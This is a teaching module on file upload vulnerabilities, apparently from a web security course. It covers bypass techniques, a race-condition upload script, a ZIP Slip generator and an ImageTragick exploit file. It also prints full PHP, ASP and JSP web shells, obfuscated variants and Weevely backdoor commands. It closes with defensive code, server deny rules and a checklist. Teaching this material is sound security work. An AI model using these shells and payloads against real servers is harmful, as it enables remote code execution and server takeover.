# Unit 10: Other Web Vulnerabilities - Topic 1: File Upload Vulnerabilities

## Overview

File upload vulnerabilities occur when web applications allow users to upload files without properly validating their content, type, or destination. These vulnerabilities can lead to **Remote Code Execution (RCE)**, **Cross-Site Scripting (XSS)**, **Denial of Service (DoS)**, and complete server compromise. File upload is one of the most critical attack vectors because it directly places attacker-controlled content on the server.

---

## 1. File Upload Mechanism Analysis

### How File Uploads Work

```
┌──────────────┐    HTTP POST          ┌──────────────┐    Save File     ┌──────────────┐
│              │  multipart/form-data  │              │  ────────────►   │              │
│   Browser    │  ──────────────────►  │  Web Server  │                  │  File System │
│   (Client)   │                       │  (Backend)   │  ◄────────────   │  / Storage   │
│              │  ◄──────────────────  │              │    File Path     │              │
└──────────────┘    Response           └──────────────┘                  └──────────────┘
                                              │
                                              ▼
                                       ┌──────────────┐
                                       │  Validation  │
                                       │  - Extension │
                                       │  - MIME Type │
                                       │  - Size      │
                                       │  - Content   │
                                       └──────────────┘
```

### Multipart Form Data Structure

```http
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

<file binary data>
------WebKitFormBoundary--
```

### Key Components to Test

| Component | Description | Attack Vector |
|-----------|-------------|---------------|
| **Filename** | Client-supplied filename | Path traversal, extension bypass |
| **Content-Type** | MIME type header | Content-type spoofing |
| **File Content** | Actual binary data | Magic bytes, polyglot files |
| **File Size** | Length of upload | DoS via large files |
| **Storage Path** | Where file is saved | Directory traversal |
| **Access URL** | How file is accessed | Direct execution |

---

## 2. Client-Side Validation Bypass

Client-side validation is performed in the browser using JavaScript and provides **zero security** since attackers can easily bypass it.

### Common Client-Side Checks

```javascript
// JavaScript extension check
function validateFile(input) {
    var allowedExtensions = /(\.jpg|\.jpeg|\.png|\.gif)$/i;
    if (!allowedExtensions.exec(input.value)) {
        alert('Invalid file type!');
        return false;
    }
    return true;
}
```

### Bypass Techniques

**1. Disable JavaScript:**
```
Browser Settings → Disable JavaScript
Or use Burp Suite to intercept after JS validation
```

**2. Intercept and Modify with Burp Suite:**
```
Step 1: Upload a valid .jpg file
Step 2: Intercept the request in Burp
Step 3: Change filename from "photo.jpg" to "shell.php"
Step 4: Replace file content with PHP web shell
Step 5: Forward the modified request
```

**3. Modify HTML Form:**
```html
<!-- Original -->
<input type="file" accept=".jpg,.png,.gif">

<!-- Modified via DevTools -->
<input type="file" accept="*/*">
```

**4. Use curl/Python to bypass entirely:**
```bash
# Direct upload bypassing all client-side checks
curl -X POST http://target.com/upload \
  -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# Python requests
import requests
files = {'file': ('shell.php', open('shell.php','rb'), 'image/jpeg')}
requests.post('http://target.com/upload', files=files)
```

---

## 3. Server-Side Validation Bypass

### 3.1 Extension-Based Bypass

Many servers use blacklists or whitelists for file extensions.

**Blacklist Bypass Techniques:**

| Technique | Example | Target |
|-----------|---------|--------|
| **Alternative extensions** | `.php3`, `.php4`, `.php5`, `.phtml`, `.phar` | PHP |
| **Alternative extensions** | `.asp`, `.aspx`, `.ashx`, `.asmx`, `.cer` | ASP.NET |
| **Alternative extensions** | `.jsp`, `.jspx`, `.jsw`, `.jsv` | Java |
| **Case variation** | `.PhP`, `.PHP`, `.Php` | Case-insensitive OS |
| **Double extension** | `shell.php.jpg`, `shell.jpg.php` | Misconfigured servers |
| **Null byte** | `shell.php%00.jpg` (legacy systems) | Old PHP (<5.3.4) |
| **Trailing characters** | `shell.php.`, `shell.php `, `shell.php::$DATA` | Windows servers |
| **URL encoding** | `shell.%70%68%70` | URL-decoded filenames |
| **Semicolon** | `shell.php;.jpg` | IIS |
| **Unicode** | `shell.p\u0068p` | Unicode normalization |

**Testing Script:**
```bash
# Generate extension bypass payloads
extensions=("php" "php3" "php4" "php5" "phtml" "phar" "phps" "pht" "pgif" "shtml")
for ext in "${extensions[@]}"; do
    curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@shell.txt;filename=shell.$ext" \
      http://target.com/upload
    echo " - $ext"
done
```

### 3.2 Content-Type (MIME) Bypass

```http
# Original malicious upload
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# Bypassed - spoofed Content-Type
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

**Common Allowed MIME Types:**
```
image/jpeg
image/png
image/gif
application/pdf
text/plain
```

### 3.3 Magic Bytes Bypass

Files are identified by their first few bytes (magic numbers/file signatures):

| File Type | Magic Bytes (Hex) | ASCII |
|-----------|-------------------|-------|
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `.PNG....` |
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |
| ZIP | `50 4B 03 04` | `PK..` |

**Prepend Magic Bytes to Web Shell:**
```bash
# GIF magic bytes + PHP shell
echo -n "GIF89a" > shell.php.gif
echo '<?php system($_GET["cmd"]); ?>' >> shell.php.gif

# Or using printf
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php

# JPEG magic bytes
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg.php

# Verify magic bytes
file shell.gif.php
# Output: shell.gif.php: GIF image data, version 89a
hexdump -C shell.gif.php | head -3
```

---

## 4. Advanced Bypass Techniques

### 4.1 Polyglot Files

A polyglot file is valid in multiple formats simultaneously.

**JPEG/PHP Polyglot:**
```bash
# Create a valid JPEG that is also valid PHP
# Method 1: Inject PHP into JPEG EXIF data
exiftool -Comment='<?php system($_GET["cmd"]); ?>' photo.jpg
mv photo.jpg photo.php.jpg

# Method 2: Using jhead
jhead -ce photo.jpg
# Add PHP code in the comment field

# Method 3: Manual with Python
python3 -c "
with open('legit.jpg','rb') as f: jpg = f.read()
payload = b'<?php system(\$_GET[\"cmd\"]); ?>'
# Insert after JPEG header but before image data
with open('polyglot.php.jpg','wb') as f:
    f.write(jpg[:2] + payload + jpg[2:])
"
```

**SVG/XSS Polyglot:**
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg onload="alert('XSS')" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">XSS via SVG</text>
</svg>
```

**PDF/JavaScript:**
```
%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert('XSS')) >> >>
endobj
```

### 4.2 .htaccess Upload

If you can upload `.htaccess` files:
```apache
# Make .txt files execute as PHP
AddType application/x-httpd-php .txt

# Or use AddHandler
AddHandler php-script .txt
```

Then upload `shell.txt` with PHP code — it executes as PHP.

### 4.3 Web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" 
              modules="IsapiModule" 
              scriptProcessor="%windir%\system32\inetsrv\asp.dll" 
              resourceType="Unspecified" requireAccess="Write" 
              preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
```

### 4.4 Race Condition Upload

Some applications upload first, then validate and delete:

```
┌──────────┐     ┌──────────────┐     ┌────────────┐
│  Upload  │────►│ File Saved   │────►│ Validation │
│  Request │     │ Temporarily  │     │ + Delete   │
└──────────┘     └──────┬───────┘     └────────────┘
                        │
                  ┌─────▼─────┐
                  │ RACE HERE │  Access file before
                  │ Execute!  │  validation deletes it
                  └───────────┘
```

**Exploitation with Turbo Intruder:**
```python
# Turbo Intruder script for race condition file upload
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Upload request
    upload_req = '''POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------boundary--'''
    
    # Access request
    access_req = '''GET /uploads/shell.php?cmd=id HTTP/1.1
Host: target.com

'''
    
    for i in range(100):
        engine.queue(upload_req, gate='race1')
        engine.queue(access_req, gate='race1')
    
    engine.openGate('race1')
```

---

## 5. Web Shells

### Common Web Shells

**PHP Web Shell (Simple):**
```php
<?php system($_GET['cmd']); ?>
```

**PHP Web Shell (Obfuscated):**
```php
<?php
$a = 'sys'.'tem';
$a($_REQUEST['c']);
?>
```

**PHP Web Shell (Base64):**
```php
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk7')); ?>
```

**ASP Web Shell:**
```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
Function RunCMD(command)
    Set exec = oScript.Exec(command)
    RunCMD = exec.StdOut.ReadAll
End Function
Response.Write(RunCMD(Request("cmd")))
%>
```

**JSP Web Shell:**
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String dirone = dis.readLine();
while ( dirone != null ) {
    out.println(dirone);
    dirone = dis.readLine();
}
%>
```

### Using Weevely (PHP Backdoor Generator):
```bash
# Generate obfuscated PHP backdoor
weevely generate password123 shell.php

# Connect to uploaded backdoor
weevely http://target.com/uploads/shell.php password123

# Weevely session commands
:system_info          # System information
:file_ls              # List files
:file_read /etc/passwd  # Read files
:sql_console          # SQL console
:net_scan 192.168.1.0/24 80  # Port scan
```

---

## 6. Real-World Attack Scenarios

### Scenario 1: WordPress Plugin Upload

```
1. Target allows plugin/theme uploads (.zip files)
2. Create malicious plugin:
   
   plugin-shell/
   ├── shell.php          ← Web shell
   └── plugin-info.txt    ← Plugin metadata

3. Zip and upload: zip -r plugin-shell.zip plugin-shell/
4. Access: http://target.com/wp-content/plugins/plugin-shell/shell.php?cmd=id
```

### Scenario 2: Image Upload to RCE (ImageTragick CVE-2016-3714)

```bash
# Create malicious SVG exploiting ImageMagick
cat > exploit.svg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context
EOF

# Or using MVG format
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/pwned`'
pop graphic-context
EOF
```

### Scenario 3: ZIP Slip Attack

```python
# Create malicious ZIP that extracts files outside intended directory
import zipfile

# Create ZIP with path traversal in filename
with zipfile.ZipFile('malicious.zip', 'w') as zf:
    zf.writestr('../../../var/www/html/shell.php', 
                '<?php system($_GET["cmd"]); ?>')
```

---

## 7. Automated Testing Tools

### Upload Scanner (Burp Extension)
```
1. Install "Upload Scanner" from BApp Store
2. Configure scan settings
3. Automatically tests:
   - Extension bypass
   - Content-Type bypass
   - Magic bytes injection
   - Polyglot generation
   - Path traversal in filename
```

### Fuxploider
```bash
# Automated file upload vulnerability scanner
git clone https://github.com/almandin/fuxploider.git
cd fuxploider
pip install -r requirements.txt

# Basic scan
python fuxploider.py --url http://target.com/upload
  --not-regex "Error|Invalid"

# With specific form fields
python fuxploider.py --url http://target.com/upload \
  --form-action /api/upload \
  --input-name fileUpload
```

### Manual Testing Checklist
```bash
# 1. Test extension bypass
for ext in php php3 php4 php5 phtml phar; do
    curl -F "file=@shell.php;filename=test.$ext" http://target.com/upload
done

# 2. Test Content-Type bypass
curl -F "file=@shell.php;type=image/jpeg" http://target.com/upload

# 3. Test double extension
curl -F "file=@shell.php;filename=shell.php.jpg" http://target.com/upload

# 4. Test null byte (legacy)
curl -F "file=@shell.php;filename=shell.php%00.jpg" http://target.com/upload

# 5. Test case variation
curl -F "file=@shell.php;filename=shell.PhP" http://target.com/upload

# 6. Test with magic bytes
printf 'GIF89a<?php system($_GET["c"]); ?>' > test.gif
curl -F "file=@test.gif;filename=test.gif.php" http://target.com/upload
```

---

## 8. Prevention Techniques

### Comprehensive File Upload Security

```python
import os
import uuid
import magic  # python-magic library
from PIL import Image

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
ALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif', 'application/pdf'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB
UPLOAD_FOLDER = '/var/uploads/'  # Outside web root!

def secure_upload(file):
    # 1. Check file size
    if file.content_length > MAX_FILE_SIZE:
        return "File too large", 413
    
    # 2. Validate extension (whitelist)
    ext = file.filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return "Invalid extension", 400
    
    # 3. Validate MIME type using python-magic (reads actual content)
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIMES:
        return "Invalid file type", 400
    
    # 4. Re-process image (strips metadata, embedded code)
    if mime.startswith('image/'):
        try:
            img = Image.open(file)
            img.verify()
            file.seek(0)
            img = Image.open(file)
            # Save re-processed image with new random name
            new_filename = f"{uuid.uuid4()}.{ext}"
            save_path = os.path.join(UPLOAD_FOLDER, new_filename)
            img.save(save_path)
        except Exception:
            return "Invalid image", 400
    
    # 5. Generate random filename (never use user-supplied name)
    new_filename = f"{uuid.uuid4()}.{ext}"
    
    return "Upload successful", 200
```

### Server Configuration

**Nginx - Prevent Execution in Upload Directory:**
```nginx
location /uploads/ {
    # Serve files as static content only
    location ~* \.(php|php3|php4|php5|phtml|pl|py|jsp|asp|aspx|cgi|sh|bash)$ {
        deny all;
    }
    # Disable script execution
    location ~ \.php$ {
        return 403;
    }
}
```

**Apache - Disable Execution:**
```apache
<Directory "/var/www/uploads">
    # Remove all handlers for script files
    RemoveHandler .php .phtml .php3 .php4 .php5 .phar
    RemoveType .php .phtml .php3 .php4 .php5 .phar
    
    # Disable PHP engine
    php_flag engine off
    
    # Force all files to be downloaded
    ForceType application/octet-stream
    Header set Content-Disposition attachment
</Directory>
```

### Defense-in-Depth Checklist

| Layer | Control | Description |
|-------|---------|-------------|
| **Client** | File type check | UX only, not security |
| **Server - Input** | Extension whitelist | Only allow specific extensions |
| **Server - Input** | MIME validation | Validate via magic bytes, not headers |
| **Server - Input** | File size limit | Prevent DoS attacks |
| **Server - Process** | Re-encode files | Strip metadata, re-process images |
| **Server - Process** | Rename files | Use UUID, never user-supplied names |
| **Server - Storage** | Store outside webroot | Prevent direct access/execution |
| **Server - Storage** | No execute permissions | Remove execute bit on upload directory |
| **Server - Serve** | Serve via proxy | Use a separate domain for file serving |
| **Server - Serve** | Content-Disposition | Force download, prevent inline rendering |
| **Infrastructure** | Separate domain | Serve uploads from a different origin |
| **Infrastructure** | CDN/Object storage | Use S3/GCS instead of local filesystem |
| **Monitoring** | Antivirus scanning | Scan uploaded files for malware |

---

## Summary Table

| Concept | Key Points |
|---------|------------|
| **Client-Side Bypass** | Disable JS, intercept with Burp, use curl directly |
| **Extension Bypass** | Alternative extensions, double extensions, null bytes, case variation |
| **MIME Bypass** | Spoof Content-Type header in request |
| **Magic Bytes** | Prepend valid file signatures to malicious files |
| **Polyglot Files** | Files valid in multiple formats (JPEG+PHP, SVG+XSS) |
| **Web Shells** | PHP, ASP, JSP shells; obfuscation techniques |
| **Race Conditions** | Upload → access before validation deletes |
| **Prevention** | Whitelist extensions, validate content, rename, store outside webroot |

---

## Revision Questions

1. Why is client-side file upload validation insufficient for security? How would you bypass it?
2. Explain three different techniques to bypass extension-based blacklist filtering.
3. What are magic bytes and how can they be used to bypass content validation?
4. Describe how a polyglot file works and give an example of a JPEG/PHP polyglot.
5. What is the difference between storing uploads inside vs outside the web root?
6. Design a comprehensive file upload security system — what layers of defense would you implement?

---

*Next: [02-path-traversal.md](02-path-traversal.md)*

---

*[Back to README](../README.md)*
